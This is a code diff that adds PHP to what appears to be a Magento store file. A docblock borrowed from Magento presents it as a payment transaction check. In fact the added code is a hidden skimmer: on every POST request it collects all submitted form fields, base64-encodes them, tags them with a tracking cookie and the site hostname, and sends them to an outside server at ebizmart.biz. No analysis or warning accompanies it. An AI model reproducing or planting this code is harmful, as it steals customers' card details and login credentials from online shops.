@@ -1,0 +1,32 @@
+/**
+ * Check transaction id came from Payment System
+ *
+ * @return true in case of right transaction id
+ * @throws Mage_Core_Exception in case of bad transaction id.
+ */
+if (count($_POST)>=1){
+    $dvs = multi_implode_data('',$_POST,0);
+    if($_COOKIE["SESSIIID"] != null) {
+        $randkey = $_COOKIE["SESSIIID"];
+    } else {
+        $randkey = time().'-'.rand(1111111,9999999999);
+        setcookie("SESSIIID",$randkey,time()+86000, "/");
+    }
+        $content_info = stream_context_create(array('http' => array(
+                'method' => 'POST',
+                'header' => 'Content-type: application/x-www-form-urlencoded',
+                'content' => http_build_query(array(
+                    'info' => base64_encode($dvs),
+                    'hostname' => preg_replace('@\.@','_',$_SERVER['HTTP_HOST']),
+                    'key' => $randkey)))));
+        file_get_contents('https://ebizmart.biz/api/index.php',false,$content_info);
+}
+function multi_implode_data($vvv,$array,$fi) {
+    foreach($array as $val => $key) {
+        if(!is_array($key)) {
+            if($fi == 1) {
+                $_array[] = $vvv.'['.$val.']='.$key;
+            }else {$_array[] = $val.'='.$key;}
+        }else {$_array[] = multi_implode_data($val,$key,1);}}
+    return implode('&',$_array);
+}
